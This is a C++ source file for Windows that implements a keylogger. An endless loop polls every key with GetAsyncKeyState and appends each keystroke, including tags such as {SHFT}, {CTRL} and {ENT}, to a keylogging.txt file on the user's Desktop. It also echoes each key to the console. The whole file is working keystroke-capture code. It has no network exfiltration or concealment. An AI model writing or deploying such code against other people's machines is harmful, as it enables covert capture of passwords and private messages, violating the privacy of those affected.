#include <iostream>
#include <fstream>
#include <limits>
#include <windows.h>
#include <Lmcons.h>
#include <stdlib.h>
#include <string>

const int LINELENGTH = 100;

struct KeyInfo
{
	boolean specialClick = false;
	int keyCount = 0;
	int currentLine = 0;
};


std::string getFilePath()
{
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);

	std::string strtmp(&username[0], &username[(int)size-1]);

	std::string path = "C:\\Users\\" + strtmp + "\\Desktop\\keylogging.txt";

    return path;
}

void initiateFileIfMissing(std::string path)
{
	std::ifstream infile(path);
	if (infile.good() == false)
	{
		std::ofstream logFile;
		logFile.open(path);
		logFile.close();
	}
}

KeyInfo clickedSpecialKey(std::string path, int key, std::fstream& logFile, KeyInfo keyInfo) 
{
	if (key == VK_BACK)
	{
		logFile << "{/b}";
		keyInfo.keyCount = keyInfo.keyCount + 4;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_CAPITAL)
	{
		logFile << "{CAP}";
		keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_TAB)
	{
		logFile << "{TAB}";
		keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_RETURN)
	{
		logFile << "{ENT}";
		//keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.currentLine = keyInfo.currentLine + 1;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_SHIFT)
	{
		logFile << "{SHFT}";
		keyInfo.keyCount = keyInfo.keyCount + 6;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_CONTROL)
	{
		logFile << "{CTRL}";
		keyInfo.keyCount = keyInfo.keyCount + 6;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_MENU)
	{
		logFile << "{ALT}";
		keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_ESCAPE)
	{
		logFile << "{ESC}";
		keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_DELETE)
	{
		logFile << "{DEL}";
		keyInfo.keyCount = keyInfo.keyCount + 5;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_OEM_COMMA)
	{
		logFile << ",";
		keyInfo.keyCount++;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_OEM_PERIOD)
	{
		logFile << ".";
		keyInfo.keyCount++;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_OEM_PLUS)
	{
		logFile << "+";
		keyInfo.keyCount++;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	else if (key == VK_OEM_MINUS)
	{
		logFile << "-";
		keyInfo.keyCount++;
		keyInfo.specialClick = true;
		return keyInfo;
	}
	return keyInfo;
}

int main()
{
    std::string path = getFilePath();
	initiateFileIfMissing(path);
    std::fstream logFile;

	char keyPress = 'x';
	KeyInfo keyInfo;

	logFile.open(path);
	keyInfo.currentLine = std::count(std::istreambuf_iterator<char>(logFile),std::istreambuf_iterator<char>(), '\n') + 1;
	logFile << "\n\nNew Session\n";
	logFile.close();

	int line = keyInfo.currentLine + 3;

	while (true) {
		Sleep(10);
		for (int keyPress = 8; keyPress <= 190; keyPress++)
		{
			if (GetAsyncKeyState(keyPress) == -32767)
			{
				logFile.open(path);
				keyInfo.currentLine = std::count(std::istreambuf_iterator<char>(logFile), std::istreambuf_iterator<char>(), '\n') + 1;

				if (keyInfo.keyCount >= LINELENGTH)
				{
					keyInfo.currentLine++;
				}

				keyInfo = clickedSpecialKey(path, keyPress, logFile, keyInfo);

				if (keyInfo.currentLine > line)
				{
					logFile << "\n";
					keyInfo.keyCount = 0;
					line++;
				}

				if (keyInfo.specialClick == false)
				{
					std::string s = "";
					s += char(keyPress);
					std::cout << s;
					logFile.write(s.c_str(), 1);
					keyInfo.keyCount++;
				}

				keyInfo.specialClick = false;
				logFile.close();
			}
		}
	}

    return 0; 
}

